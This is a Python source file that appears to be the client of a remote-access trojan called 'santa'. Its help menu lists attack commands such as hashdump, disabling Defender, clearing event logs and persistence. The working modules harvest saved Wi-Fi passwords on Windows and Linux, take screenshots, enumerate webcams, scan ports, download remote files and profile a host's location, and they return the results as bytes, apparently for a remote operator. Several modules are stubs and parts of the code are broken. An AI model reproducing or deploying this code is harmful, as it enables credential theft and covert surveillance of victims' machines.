import re
import socket
from sqlite3 import connect
import subprocess
import pickle
import json
import os
import base64
import time
import threading
import uuid
import colorama
import sys
import shutil
import platform
import uuid
import urllib.request
from cv2 import subtract
import pyautogui
import random
import requests
import psutil
import GPUtil
from tabulate import tabulate
from queue import Queue
# from ctypes import Structure, windll, c_uint, sizeof, byref
# import wmi
import cv2
from collections import namedtuple
import configparser
try:
    from PyQt5.QtWidgets import *
    from PyQt5.QtGui import *
    from PyQt5.QtCore import *
    from PyQt5.QtWebEngineWidgets import *
except:
    from tkinter import *
from colorama import Fore
colorama.init(autoreset=True)
format = 'utf-8'
buffer_size = 1024 * 128



def display_all_commands_help_func():
    page1 = """
    Core Commands                   Page 1/6
    =============

        Command       		    Description
        -------       		    -----------
        ?             		    Help menu, use ?<PAGE> to navigate through the pages, e.g.: ?5
        cd            		    Print and change the current working directory
        clear         		    Clears the screen of the local machine
        connect       		    Communicate with a host
        download          	    Download a file from the targetted machine
        exec                        Execute an executable file
        features      	            Display the list of not yet released features that can be opted in to
        help                        Help menu, help <command>, e.g.: help src
        history                     Show command history
        !quit          		    Put the client in sleep mode
        run                         Run an expl0it
        sysinfo           	    Gets system information
        upload                      Upload a file to the current directory

"""

    page2 = """
    More Commands     Page 2/6
    =============

        lsrc          Repeat a list of commands
        route         Route traffic through a session
        save          Saves the active datastores
        sessions      Dump session listings and display information about sessions
        show          Shows a list of attack methods, payloads, plugins and exploits
        sleep         Do nothing for the specified number of seconds
        threads       View and manipulate background threads
        tips          Show a list of useful productivity tips
        interact      Configure shell autocompletion
        use           Use a method for further attacks
        version       Show the framework and console library version names and numbers
"""

    page3 = """
    Module Commands   Page 3/6
    ===============

        Command       Description
        -------       -----------
        bcap          Battery information
        browse        Displays advanced options for one or more modules
        browsers      Displays all available browsers installed
        cam           Turns on the camera (default=front camera)
        cam_list      Displays the available cameras
        clearev       Clears the Application, System, and Security logs on a Windows system
        decrypt       Decrypt a file
        defoff        Turns W1nd0ws def3nder to OFF (PERMANENTLY)
        dget          Download a file from the Internet
        du            Displays disk information
        encrypt       Encrypt a file
        exec          Execute an executable file
        expl          Run an expl0it
        getuid        Displays the user that the server is running as on the host
        gpu           Displays GPU details
        hashdump      Dump the contents of the SAM database
        idletime      Displays the number of seconds that the user at the remote machine has been idle
        pc            Add a persistency to a program
        pss           Displays a list of running processes on the client
        rec           Record a video
        resrc         Executes commands inside a text file to automate repetitive actions
        search        Locates a specific files on the client
        shell         Presents a standard shell on the client
        startup       Add a persistency to a program (Windows only)
        src           Take a screenshot
        timeinfo      Displays boot time, current time, and time spend (on the client)
        web_cam       Same as "cam"
        webcam_list   Same as "cam_list"
        wifips        Displays saved Wi-Fi passw0rds
        """

    page4 = """
    Job Commands     Page 4/6
    ============

        Command       Description
        -------       -----------
        handler       Start a payl0ad handler as job
        jobs          Displays and manages jobs
        kill          Kill a job
        rename_job    Rename a job


    Resource Script Commands
    ========================

        Command       Description
        -------       -----------
        makerc        Save commands entered since start to a file
        resrc         Run the commands stored in a file
        """

    page5 = """
    Database Backend Commands       Page 5/6
    =========================

        Command           Description
        -------           -----------
        analyze           Analyze database information about a specific address or address range
        db_connect        Connect to an existing data service
        db_disconnect     Disconnect from the current data service
        db_export         Export a file containing the contents of the database
        db_import         Import a scan result file (filetype will be auto-detected)
        db_nmap           Executes nmap and records the output automatically
        db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
        db_remove         Remove the saved data service entry
        db_save           Save the current data service connection as the default to reconnect on startup
        db_status         Show the current data service status
        hosts             List all hosts in the database
        loot              List all loot in the database
        notes             List all notes in the database
        services          List all services in the database
        vulns             List all vulnerabilities in the database
        workspace         Switch between database workspaces
        """

    page6 = """
    Credentials Backend Commands        Page 6/6
    ============================

        Command       Description
        -------       -----------
        creds         List all credentials in the database


    Developer Commands
    ==================

        Command       Description
        -------       -----------
        edit          Edit the current module or a file with the preferred editor
        pysh          Open an interactive Python shell in the current context
        jsi           Execute a Javascript code in the openned browser(s)
        log           Display framework.log paged to the end if possible
        pry           Open the Pry debugger on the current module or Framework
        reload_lib    Reload Python library files from specified paths
        time          Time how long it takes to run a particular command
        """
    
    all_pages = [page1, page2, page3, page4, page5, page6]
    return all_pages
    
def custom_cmd(cmd):
    for every_char in cmd:
        if every_char == ' ':
            try:
                cmd = cmd.split()
            except AttributeError:
                pass
    check_for_args = isinstance(cmd, list)
    args = ''
    if check_for_args == True:
        args = cmd[1:]
        cmd = cmd[0]
    if cmd == 'os':
        if platform.platform()[0:7] == 'Windows':
            return bytes(Fore.LIGHTBLUE_EX + platform.platform()[0:10], format)  # note: use Fore.BLUE to return a blue output!
        elif platform.platform()[0:5] == 'Linux':
            return bytes(Fore.LIGHTBLUE_EX + platform.platform()[0:5], format)  # note: use Fore.BLUE to return a blue output!
    elif cmd == '?' or cmd == '/?' or cmd == '/':
        help_func = display_all_commands_help_func()
        send_help_page = help_func[0]
        return bytes(Fore.LIGHTGREEN_EX + f'\n{send_help_page}\n', format)
    elif cmd == '?1' or cmd == '?2' or cmd == '?3' or cmd == '?4' or cmd == '?5' or cmd == '?5' or cmd == '?6':
        page = int(cmd[1])
        help_func = display_all_commands_help_func()
        send_help_page = help_func[page-1]
        return bytes(Fore.LIGHTGREEN_EX + f'\n{send_help_page}\n', format)

    elif cmd == 'bcap':
        try:
            bcap_ = psutil.sensors_battery()
            return bytes(Fore.YELLOW + f'\nBattery: {bcap_}\n', format)
        except:
            return bytes(Fore.RED + f'\n[-] No information\n', format)



    elif cmd == 'browse':
        def browse_(browser, url):
            if browser != 'firefox': # and safari, chrome, brave, etc
                try:
                    class Browser():
                        def __init__(self):
                            super(Browser, self)
                            self.window = QWidget()
                            self.window.setWindowTitle(' ')  # no title
                            self.layout = QVBoxLayout()
                            self.browser = QWebEngineView()
                            self.layout.addWidget(self.browser)
                            self.browser.setUrl(QUrl(url))
                            self.window.setLayout(self.layout)
                            self.window.showFullScreen()
                    browser_ = QApplication([])
                    window = Browser()
                    browser_.exec_()
                except:
                    pass
        try:
            browse_(args[0], args[1])
        except:
            browse_('custom_browser', 'https://newsroom.unsw.edu.au/sites/default/files/thumbnails/image/6_neanderthal_reconst_3.jpg')
        if platform.platform()[0:5] != 'Linux':
            return bytes(Fore.GREEN + '\n[+] Browser openned\n' + Fore.RED + '[-] Browser closed\n', format)
        else:
            return bytes(Fore.RED + '\n[-] Error occurred\n' + Fore.MAGENTA + f'[*] The module cannot be used on Linux systems\n', format)

    elif cmd == 'browsers':
        def browsers_():
            pass
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] No browsers are installed\n', format)



    elif cmd == 'cam':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)

    elif cmd == 'cam_list':
        def list_cams():
            global available_ports, working_ports, error_MSGs
            is_working = True
            dev_port = 0
            working_ports = []
            available_ports = []
            error_MSGs = ""
            while is_working:
                camera = cv2.VideoCapture(dev_port)
                if not camera.isOpened():
                    is_working = False
                    error_MSGs += "Port %s is not working\n" %dev_port
                else:
                    is_reading, img = camera.read()
                    w = camera.get(3)
                    h = camera.get(4)
                    if is_reading:
                        error_MSGs += "Port %s is working and reads images (%s x %s)\n" %(dev_port,h,w)
                        working_ports.append(dev_port)
                    else:
                        error_MSGs += ("Port %s for camera ( %s x %s) is present but does not reads\n" %(dev_port,h,w))
                        available_ports.append(dev_port)
                dev_port +=1
        cam_list = list_cams()
        return bytes(Fore.YELLOW + f"\n{'-'*20}\nAvailable Ports:\n{available_ports}\n\n{'-'*20}\nWorking Ports:\n{working_ports}\n\n" + Fore.RED + f'[-] Error occurred\n' + Fore.YELLOW + f'\nInfo:\n{error_MSGs}', format)
    
    
    elif cmd == 'clearev':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)

    elif cmd == 'connect':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)
    elif cmd == 'decrypt':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)

    elif cmd == 'defoff':
        return bytes(Fore.LIGHTGREEN_EX + '\n[@] This module is forbidden\n', format)

    elif cmd == 'dget':
        def download_f(url, name):
            try:
                if name:
                    pass
                else:
                    name = req.url[url.rdfind("/")+1:]

                with requests.get(url) as req:
                    with open(name, 'wb') as f:
                        for chunk in req.iter_content(chunk_size=8192):
                            if chunk:
                                f.write(chunk)
                    return name
            except Exception as error_info:
                return error_info
        try:
            download_f(args[0], args[1])
        except IndexError:
            return bytes(Fore.RED + '\n[-] Error occurred\n' + Fore.CYAN + f'[i] Tip: dget <url> <filename.txt>\n' + Fore.LIGHTGREEN_EX + '[@] Help: type "help dget"\n', format)
        return bytes(Fore.GREEN + '\n[+] Download successful\n' + Fore.CYAN + f'[i] File saved as: {args[1]}\n' + Fore.LIGHTMAGENTA_EX + f'[*] File saved in: {os.getcwd()}\n', format)
    
    elif cmd == 'du':
        def get_SIZE(bytes, suffix="B"):
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f} {unit}{suffix}"
                bytes /= factor
        DU_INFO1 = "="*10 + " Disk Information " + "="*10 + '\n'
        DU_INFO2 = " Partitions and Usage:\n"
        duinfo = ""
        partitions = psutil.disk_partitions()
        for partition in partitions:
            duinfo += '\n'
            duinfo += f"=== Device: {partition.device} ==="
            duinfo += f"  Mountpoint: {partition.mountpoint}"
            duinfo += f"  File system type: {partition.fstype}"
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            DU_INFO3 = f"\n\n  Total Size: {get_SIZE(partition_usage.total)}" + '\n' + f"  Used: {get_SIZE(partition_usage.used)}" + '\n' + f"  Free: {get_SIZE(partition_usage.free)}" + '\n' + f"  Percentage: {partition_usage.percent}%"
        disk_io = psutil.disk_io_counters()
        DU_INFO4 = f"\n  Total read: {get_SIZE(disk_io.read_bytes)}" + '\n' + f"\n  Total write: {get_SIZE(disk_io.write_bytes)}"
        return bytes(Fore.YELLOW + f'\n{DU_INFO1}{DU_INFO2}{duinfo}{DU_INFO3}{DU_INFO4}\n', format)


    elif cmd == 'encrypt':
        return bytes(Fore.RED + '\n[-] Encryption failed\n', format)
    elif cmd == 'exec':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)
    elif cmd == 'expl':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)
    elif cmd == 'getuid':
        hostname = socket.gethostname()
        return bytes(Fore.YELLOW + f'{hostname}\n', format)

    elif cmd == 'gpu':
        cgpu_var = '\n' + "="*40 + " GPU Details " + "="*40 + '\n'
        gpus = GPUtil.getGPUs()
        list_gpus = []
        for gpu in gpus:
            gpu_id = gpu.id
            gpu_name = gpu.name
            gpu_load = f"{gpu.load*100}%"
            gpu_free_memory = f"{gpu.memoryFree}MB"
            gpu_used_memory = f"{gpu.memoryUsed}MB"
            gpu_total_memory = f"{gpu.memoryTotal}MB"
            gpu_temperature = f"{gpu.temperature} `C"
            list_gpus.append((
                gpu_id, gpu_name, gpu_load, gpu_free_memory, gpu_used_memory,
                gpu_total_memory, gpu_temperature
            ))
        cgpu_var += tabulate(list_gpus, headers=("ID", "Name", "Load", "Free memory", "Used memory", "Total memory", "Temperature"))
        gpu_uuid = gpu.uuid
        gpuuuid = f"\nUUID: \t{gpu_uuid}"
        return bytes(Fore.YELLOW + f'{cgpu_var}\n\n{"="*93}{gpuuuid}\n{"="*93}\n', format)



    elif cmd == 'hashdump':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)
    elif cmd == 'help':
        try:
            if args[0]: return bytes(Fore.LIGHTGREEN_EX + f' ', format)
        except IndexError:
                help_func = display_all_commands_help_func()
                send_help_page = help_func[0]
                return bytes(Fore.LIGHTGREEN_EX + f'\n{send_help_page}\n', format)


    elif cmd == 'idletime':
        class LASTINPUTINFO(Structure):
            _fields_ = [
                ('cbSize', c_uint),
                ('dwTime', c_uint),
            ]

        def get_idle_duration():
            lastInputInfo = LASTINPUTINFO()
            lastInputInfo.cbSize = sizeof(lastInputInfo)
            windll.user32.GetLastInputInfo(byref(lastInputInfo))
            millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
            return millis / 1000.0
        idletime = get_idle_duration()
        return bytes(Fore.YELLOW + f'Idletime: {idletime} seconds\n', format)


    elif cmd == 'interact':
        return bytes(Fore.LIGHTBLUE_EX + '\n[@] Console updated\n', format)
    
    elif cmd == 'jsi':
        return bytes(Fore.LIGHTRED_EX + '\n[@] Console Error: Javascript Interpreter is not supported\n', format)
    
    
    elif cmd == 'lpwd' or cmd == 'lcd' or cmd == 'lcp':
        if cmd == 'lpwd':
            linfo = '\nLocal working directory:\n'
        elif cmd == 'lcd':
            linfo = '\nChanging local working directory to:\n'
        else:
            linfo = '\nCopying file\n'
        return bytes(Fore.CYAN + f'\n[i] {linfo}\n', format)


    elif cmd == 'mic':
        return bytes(Fore.LIGHTRED_EX + '\nmic\n', format)
    elif cmd == 'msg':
        return bytes(Fore.LIGHTRED_EX + '\n[@] Message: msg\n', format)


    elif cmd == 'nwi':
        def get_size_of(bytes, suffix="B"):
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f} {unit}{suffix}"
                bytes /= factor
        if_addrs = psutil.net_if_addrs()
        nwi_info = "="*40 + " Network Information " + "="*40 + '\n'
        for interface_name, interface_addresses in if_addrs.items():
            for address in interface_addresses:
                nwi_info += f"=== Interface: {interface_name} ===" + '\n'
                if str(address.family) == 'AddressFamily.AF_INET':
                    nwi_info += f"  IP Address: {address.address}" + '\n'
                    nwi_info += f"  Netmask: {address.netmask}" + '\n'
                    nwi_info += f"  Broadcast IP: {address.broadcast}" + '\n'
                elif str(address.family) == 'AddressFamily.AF_PACKET':
                    nwi_info = f"  MAC Address: {address.address}" + '\n'
                    nwi_info = f"  Netmask: {address.netmask}" + '\n'
                    nwi_info = f"  Broadcast MAC: {address.broadcast}" + '\n'
        net_io = psutil.net_io_counters()
        all_nwi_info = nwi_info + f"\nTotal Bytes Sent: {get_size_of(net_io.bytes_sent)}" + f"\nTotal Bytes Received: {get_size_of(net_io.bytes_recv)}"
        return bytes(Fore.YELLOW + f'\n{all_nwi_info}\n', format)


    elif cmd == 'pc':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)

    elif cmd == 'prs':
        try:  # check for args
            target = args[0]
            THREADS = int(args[1])
        except:  # if no args: send an error msg
            portttSc4nErrorMSG = Fore.RED + '\n[-] Error occurred'
            return bytes(Fore.RED + f'{portttSc4nErrorMSG}\n' + Fore.LIGHTGREEN_EX + '[@] Console: No arguments were specified\n', format)
        socket.setdefaulttimeout(0.25)
        print_lock = threading.Lock()
        t_IP = socket.gethostbyname(target)
        portttSc4nMSG = f'Scan performed on host: ' + Fore.YELLOW + t_IP + Fore.LIGHTMAGENTA_EX + ' with ' + Fore.YELLOW + str(THREADS) + Fore.LIGHTMAGENTA_EX + ' threads'
        open_ports = ""
        def portscan(port):
            global open_ports
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                con = s.connect((t_IP, port))
                with print_lock:
                    open_ports += f"Port {port} is open\n"
                    con.close()
            except:
                pass
        def threader():
            while True:
                worker = q.get()
                portscan(worker)
                q.task_done()
        q = Queue()
        startTime = time.time()
        for x in range(THREADS):
            t = threading.Thread(target = threader)
            t.daemon = True
            t.start()
        for worker in range(1, 7000):
            q.put(worker)
        q.join()
        Time_Taken = time.time() - startTime
        Time_Taken = f"{Time_Taken}"
        prs_final_msg = f"Scanned For {Time_Taken[0:4]} seconds"
        print(open_ports)
        socket.setdefaulttimeout(None)
        return bytes(Fore.LIGHTMAGENTA_EX + f'\n[*] {portttSc4nMSG}\n\n{"-"*10}\n{open_ports}\n{"-"*10}\n\n{prs_final_msg}\n', format)



    elif cmd == 'pss':
        processes = ""
        label = "pid        Process name"
        if platform.platform()[0:7] == 'Windows':
            f = wmi.WMI()
            for process in f.Win32_Process():
                processes += f"{process.ProcessId:<10} {process.Name}\n"
        return bytes(Fore.YELLOW + f'\n{label}\n\n{processes}', format)


    elif cmd == 'rec':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)
    elif cmd == 'run':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)
    elif cmd == 'search':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)
    elif cmd == 'shell':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)
    elif cmd == 'src':
        try:
            def take_src(directory):
                global img_file_name, path, DIR
                DIR = directory
                chars = '1234567890asdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
                img_file_name = 'screenshot'
                for r in range(20):
                    img_file_name += random.choice(chars)
                img_file_name += '.png'
                if platform.platform()[0:7] == 'Windows':
                    path = directory + '\\' + img_file_name
                else:
                    path = directory + '/' + img_file_name
                pyautogui.screenshot(path)
            try:
                save_in = args[0]
                already_printed_cwd = False
            except IndexError:
                save_in = os.getcwd()
                already_printed_cwd = True
            take_src(save_in)
            cwd_var = os.getcwd()
            if save_in == '..':
                cwd_var = cwd_var.split("\\")
                cwd_var = cwd_var[0:-1]
                place = ''
                for i in cwd_var:
                    place += i
                    place += '\\'
                cwd_var = place[0:-1]
            else:
                if already_printed_cwd != True:
                    cwd_ = os.getcwd()
                else:
                    already_printed_cwd = False
                    cwd_ = ''
                cwd_var = cwd_ + '\\' + save_in
            return bytes(Fore.GREEN + '\n[+] Screenshot successful\n' + Fore.CYAN + f'[i] Saved as: {img_file_name}\n' + Fore.LIGHTMAGENTA_EX + f'[*] Saved In: {cwd_var}\n', format)
        except FileNotFoundError:
            return bytes(Fore.RED + f'\n[-] Folder not found: {DIR}\n', format)


    elif cmd == 'srq':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)



    elif cmd == 'startup':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)


    elif cmd == 'sysinfo':
        class SysData:
            def __init(self):
                pass

            @property
            def mac(self):
                try:
                    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
                    return mac
                except: return 'unknown'

            @property
            def public_ip(self):
                try: return urllib.request.urlopen('https://api.apify.org/').read().decode(format)
                except: return 'unknown'

            @property
            def location(self):
                try:
                    data = urllib.request.urlopen('https://freegeoip.app/json/').read().decode(format)
                    json_data = json.loads(data)
                    country_name = json.data['country_name']
                    city = json_data['city']
                    return f'{city}, {country_name}'
                except: return 'unknown'

            @property
            def architecture(self):
                uname = platform.uname()
                try:
                    return uname.machine
                except: return 'unknown'

            @property
            def machineInfo(self):
                try: return platform.system()
                except: return 'unknown'

            @property
            def core(self):
                try: return platform.machine()
                except: return 'unknown'

            @property
            def hostname(self):
                try:
                    hostname = socket.getfqdn(socket.gethostname()).strip()
                    return hostname
                except: return 'unknown'
            
            @property
            def release(self):
                try:
                    uname = platform.uname()
                    release = uname.release
                    return release
                except: return 'unknown'

            @property
            def version(self):
                try:
                    uname = platform.uname()
                    version = uname.version
                    return version
                except: return 'unknown'
            
            @property
            def processor(self):
                try:
                    uname = platform.uname()
                    processor = uname.processor
                    return processor
                except: return 'unknown'
        data = SysData()    
        all_data = (
            ' System: ' + data.machineInfo + '\n' +
            ' Release: ' + data.release + '\n' +
            ' Version: ' + data.version + '\n' +
            ' Core: ' + data.core + '\n' +
            ' Architecture: ' + data.architecture + '\n' +
            ' Hostname: ' + data.hostname + '\n' +
            ' Public IP: ' + data.public_ip + '\n' +
            ' Location: ' + data.location + '\n' +
            ' MAC Address: ' + data.mac.upper() + '\n' +
            ' Processor: ' + data.processor
             )

        return bytes(Fore.YELLOW + f'\n{all_data}\n', format)


    elif cmd == 'syspower':
        def get_size(bytes, suffix="B"):
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f} {unit}{suffix}"
                bytes /= factor
        INFO__ = "="*10, "CPU Info", "="*10
        INFO__1 = "Physical cores: "
        INFO__1 += str(psutil.cpu_count(logical=False))
        INFO__2 = "Total cores: "
        INFO__2 += str(psutil.cpu_count(logical=True))
        cpufreq = psutil.cpu_freq()
        INFO__3 = f"Max Frequency: {cpufreq.max:.2f}Mhz"
        INFO__4 = f"Min Frequency: {cpufreq.min:.2f}Mhz"
        INFO__5 = f"Current Frequency: {cpufreq.current:.2f}Mhz"
        INFO__6 = "CPU Usage Per Core:"
        INFO__7 = ""
        swap = psutil.swap_memory()
        for i, percentage in enumerate(psutil.cpu_percent(percpu=True, interval=1)):
            INFO__7 += f"\t\tCore {i+1}: {percentage}%"
            # plus additional information for swap
            if i == 1:
                INFO__7 += f"\t\t\t\tTotal: {get_size(swap.total)}"
            elif i == 2:
                INFO__7 += f"\t\t\t\tFree: {get_size(swap.free)}"
            elif i == 3:
                INFO__7 += f"\t\t\t\tUsed: {get_size(swap.used)}"
            elif i == 4:
                INFO__7 += f"\t\t\t\tPercentage: {swap.percent}%"
            INFO__7 += '\n'
        INFO__8 = f"Total CPU Usage: {psutil.cpu_percent()}%"
        info__ = ' '.join(INFO__)
        info__1 = ''.join(str(INFO__1))
        info__2 = ''.join(str(INFO__2))
        info__3 = ''.join(str(INFO__3))
        info__4 = ''.join(str(INFO__4))
        info__5 = ''.join(str(INFO__5))
        info__6 = ''.join(str(INFO__6))
        info__7 = ''.join(str(INFO__7))
        info__8 = ''.join(str(INFO__8))
        RAM_USG = psutil.virtual_memory()[2]
        CPUcount = os.cpu_count()
        memoryINFO1 = "="*10 + " Memory Information " + "="*10 + '\n'
        svmem = psutil.virtual_memory()
        memoryINFO2 = f"Total: {get_size(svmem.total)}" + '\n'
        memoryINFO3 = f"Available: {get_size(svmem.available)}" + '\n'
        memoryINFO4 = f"Used: {get_size(svmem.used)}" + '\n'
        memoryINFO5 = f"Percentage: {svmem.percent}%" + '\n'
        memoryINFO6 = "="*17 + " SWAP " + "="*17 + '\n'
        cinfo = '\t\t' + info__ + '\t\t' + memoryINFO1 + '\n' + '\t\t' + info__1 + '\t\t\t' + memoryINFO2 + '\t\t' + info__2 + '\t\t\t\t' + memoryINFO3 + '\t\t' + info__4 + '\t\t\t' + memoryINFO5 + '\t\t' + info__5 + '\n\t\t' + info__6 + '\t\t\t' + memoryINFO6 + info__7 + '\n\t\t' + info__8 + '\t\t\t' + f'RAM Usage: {RAM_USG}%'
        return bytes(Fore.YELLOW + f'\n{cinfo}\n', format)


    elif cmd == 'time':
        from datetime import datetime
        now__ = datetime.now()
        ctime__ = now__.strftime("%H:%M:%S.%f")
        return bytes(Fore.LIGHTGREEN_EX + f'[@] Client: {ctime__}\n', format)


    elif cmd == 'timeinfo':
        from datetime import datetime
        info_ = "="*11 + " Boot Time " + "="*11
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        info_1 = f" Boot Time: {bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"
        import datetime
        now = datetime.datetime.now()
        info_2 = "="*10 + " Current Time " + "="*10 + "\n" + " Current Time: "
        info_2 += now.strftime("%Y/%m/%d ")
        hour_now = now.strftime("%H")
        min_now = now.strftime("%M")
        sec_now = now.strftime("%S")
        if hour_now[0] == '0':
            hour_now = hour_now[1]
        if min_now[0] == '0':
            min_now = min_now[1]
        if sec_now[0] == '0':
            sec_now = sec_now[1]
        info_2 += hour_now + ':' + min_now + ':' + sec_now
        hours1 = hour_now
        mins1 = min_now
        secs1 = sec_now
        hours2 = bt.hour
        mins2 = bt.minute
        secs2 = bt.second

        def hours_to_secs(time, hours):
            global HOURS1, HOURS2
            if time == 1:
                HOURS1 = hours * 3600
            else:
                HOURS2 = hours * 3600

        def mins_to_secs_(time, mins):
            global MINS1, MINS2
            if time == 1:
                MINS1 = mins * 60
            else:
                MINS2 = mins * 60

        hours_to_secs(1, int(hour_now))
        hours_to_secs(2, int(bt.hour))
        mins_to_secs_(1, int(min_now))
        mins_to_secs_(2, int(bt.minute))
        before_decimal_point = ''
        time1_in_seconds = int(HOURS1) + int(MINS1) + int(secs1)
        time2_in_seconds = int(HOURS2) + int(MINS2) + int(secs2)

        def subract(more, less):
            global after_decimal_point, total_hours, before_decimal_point
            difference = more - less
            total_hours = difference * 0.0166 / 60
            after_decimal_point = str(difference * 0.0166 / 60)[3:4]
            before_decimal_point = str(difference * 0.0166 / 60)[0:3]
            before_decimal_point = before_decimal_point.split('.')
            before_decimal_point = str(before_decimal_point[0])
            total_hours = str(total_hours)

            def return_total_hours():
                global after_decimal_point, total_hours, before_decimal_point
                if int(after_decimal_point) >= 90:
                    before_decimal_point = int(before_decimal_point) + 1
                    before_decimal_point = str(before_decimal_point)
                elif int(after_decimal_point) >= 65 and int(after_decimal_point) < 90:
                    before_decimal_point = float(before_decimal_point) + 0.45
                    before_decimal_point = str(before_decimal_point)
                elif int(after_decimal_point) >= 45 and int(after_decimal_point) < 75:
                    before_decimal_point = float(before_decimal_point) + 0.30
                    before_decimal_point = str(before_decimal_point) + '0'
                elif int(after_decimal_point) >= 25 and int(after_decimal_point) < 45:
                    before_decimal_point = float(before_decimal_point) + 0.15
                    before_decimal_point = str(before_decimal_point)
                else:
                    before_decimal_point = int(before_decimal_point) // 1
                    before_decimal_point = str(before_decimal_point)
                return before_decimal_point
            try: 
                total_hours = return_total_hours()
            except ValueError:
                after_decimal_point = str(difference * 0.0166 / 60)[4:5]
                total_hours = return_total_hours()

        subract(time1_in_seconds, time2_in_seconds)
        time_spend = '\n' + '='*11 + ' Time Spent ' + '='*11 + f'\n Time Spent: {total_hours}h'
        return bytes(Fore.YELLOW + f'\n{info_}\n{info_1}\n\n{info_2}\n{time_spend}\n', format)


    elif cmd == 'use':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)
    elif cmd == 'version':
        return bytes(Fore.LIGHTGREEN_EX + '\n[@] Client: santa v1.0.0 catbird seat\n', format)

    elif cmd == 'web_cam':
        return bytes(Fore.LIGHTMAGENTA_EX + '\n[*] This module is not supported\n', format)



    elif cmd == 'webcam_list':
        def list_cams():
            global available_ports, working_ports, error_MSGs
            is_working = True
            dev_port = 0
            working_ports = []
            available_ports = []
            error_MSGs = ""
            while is_working:
                camera = cv2.VideoCapture(dev_port)
                if not camera.isOpened():
                    is_working = False
                    error_MSGs += "Port %s is not working\n" %dev_port
                else:
                    is_reading, img = camera.read()
                    w = camera.get(3)
                    h = camera.get(4)
                    if is_reading:
                        error_MSGs += "Port %s is working and reads images (%s x %s)\n" %(dev_port,h,w)
                        working_ports.append(dev_port)
                    else:
                        error_MSGs += ("Port %s for camera ( %s x %s) is present but does not reads\n" %(dev_port,h,w))
                        available_ports.append(dev_port)
                dev_port +=1
        cam_list = list_cams()
        return bytes(Fore.YELLOW + f"\n{'-'*20}\nAvailable Ports:\n{available_ports}\n\n{'-'*20}\nWorking Ports:\n{working_ports}\n\n" + Fore.RED + f'[-] Error occurred\n' + Fore.YELLOW + f'\nInfo:\n{error_MSGs}', format)


    elif cmd == 'wifips':
        def run_():
            global pwp, plp
            pwp = ""
            plp = ""
            def gwss():
                output = subprocess.check_output("netsh wlan show profiles").decode()
                ssids = []
                profiles = re.findall(r"All User Profile\s(.*)", output)
                for profile in profiles:
                    ssid = profile.strip().strip(":").strip()
                    ssids.append(ssid)
                return ssids

            def gwswp(verbose=1):
                ssids = gwss()
                Profile = namedtuple("Profile", ["ssid", "ciphers", "key"])
                profiles = []
                for ssid in ssids:
                    ssid_details = subprocess.check_output(f"""netsh wlan show profile "{ssid}" key=clear""").decode()
                    ciphers = re.findall(r"Cipher\s(.*)", ssid_details)
                    ciphers = "/".join([c.strip().strip(":").strip() for c in ciphers])
                    key = re.findall(r"Key Content\s(.*)", ssid_details)
                    try:
                        key = key[0].strip().strip(":").strip()
                    except IndexError:
                        key = "None"
                    profile = Profile(ssid=ssid, ciphers=ciphers, key=key)
                    if verbose >= 1:
                        pwpfunc(profile)
                    profiles.append(profile)
                return profiles

            def pwpfunc(profile):
                global pwp
                pwp += f"{profile.ssid:25}{profile.ciphers:15}{profile.key:50}\n"

            def pwprofiles(verbose):
                global infoMSG_p
                infoMSG_p = "SSID                     CIPHER(S)      KEY\n"
                gwswp(verbose)

            def glswp(verbose=1):   
                network_connections_path = "/etc/NetworkManager/system-connections/"
                fields = ["ssid", "auth-alg", "key-mgmt", "psk"]
                Profile = namedtuple("Profile", [f.replace("-", "_") for f in fields])
                profiles = []
                for file in os.listdir(network_connections_path):
                    data = { k.replace("-", "_"): None for k in fields }
                    config = configparser.ConfigParser()
                    config.read(os.path.join(network_connections_path, file))
                    for _, section in config.items():
                        for k, v in section.items():
                            if k in fields:
                                data[k.replace("-", "_")] = v
                    profile = Profile(**data)
                    if verbose >= 1:
                        plpfunc(profile)
                    profiles.append(profile)
                return profiles

            def plpfunc(profile):
                global plp
                plp += f"{str(profile.ssid):25}{str(profile.auth_alg):5}{str(profile.key_mgmt):10}{str(profile.psk):50}"

            def plprofiles(verbose):
                global infoMSG_p
                infoMSG_p = "SSID                     AUTH KEY-MGMT  PSK\n"
                glswp(verbose)
                
            def print_profiles(verbose=1):
                if os.name == "nt":
                    pwprofiles(verbose)
                elif os.name == "posix":
                    plprofiles(verbose)
                else:
                    return bytes(Fore.RED + '\n[-] This operating system is not supported\n', format)
            try:
                pwp += ' '
            except:
                pwp = plp
            print_profiles()
        run_()
        return bytes(Fore.YELLOW + f'\n{infoMSG_p}\n{pwp}\n', format)



    # (system cmds)
